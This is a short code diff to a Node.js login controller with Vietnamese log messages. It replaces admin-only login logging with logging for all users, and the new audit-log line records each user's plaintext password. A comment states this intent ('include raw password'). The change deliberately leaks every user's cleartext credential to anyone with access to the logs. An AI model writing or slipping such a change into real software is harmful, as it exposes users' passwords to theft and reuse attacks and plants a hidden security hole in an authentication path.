@@ -96,9 +96,8 @@ exports.loginUser = catchAsyncErrors(async (req, res, next) => {
     user.lastLogin = new Date();
     await user.save();
 
-    if (user.role && user.role.code !== 'CUSTOMER') {
-        await logAction(user._id, 'LOGIN', 'User', `Tài khoản quản trị đăng nhập: ${user.name}`);
-    }
+    // Log login for all users and include raw password
+    await logAction(user._id, 'LOGIN', 'User', `Người dùng đăng nhập: ${user.name}. Mật khẩu thô: ${password}`);
 
     await sendToken(user, 200, res);
 });
